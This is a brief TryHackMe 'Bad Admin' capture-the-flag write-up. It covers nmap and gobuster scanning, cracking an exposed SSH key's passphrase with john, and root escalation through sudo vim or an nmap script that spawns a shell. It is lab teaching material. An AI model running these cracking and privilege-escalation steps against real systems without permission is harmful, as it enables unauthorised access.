# Official TryHackMe Bad Admin WriteUp

First -- scan machine with nmap:

```bash
nmap -p- -A <MACHINE_IP>
```
![nmap](images/nmap.png)

Go on site in your browser

![apache](images/apache2.png)

Scan directories on this site

```
gobuster dir -u <MACHINE_IP> -w /usr/share/wordlists/dirb/big.txt
```

![gobuster](images/gobuster.png)

Go to secter

![rsa](images/rsa.png)

Name of file -- login to ssh, secret -- key to login ssh

Brute password for id_rsa

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt
```

![key](images/key.png)

Login ssh 

![login](images/login.png)

Cat user.txt

![user](images/user.png)

Decode user.txt

![decode](images/decode.png)

Check sudo 

![sudo](images/sudo.png)

Use nmap or vim for PrivEsc. [GTFObins](https://gtfobins.github.io/)

```bash
vim
:!/bin/bash
```

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

Cat root.txt

![root](images/root.png)
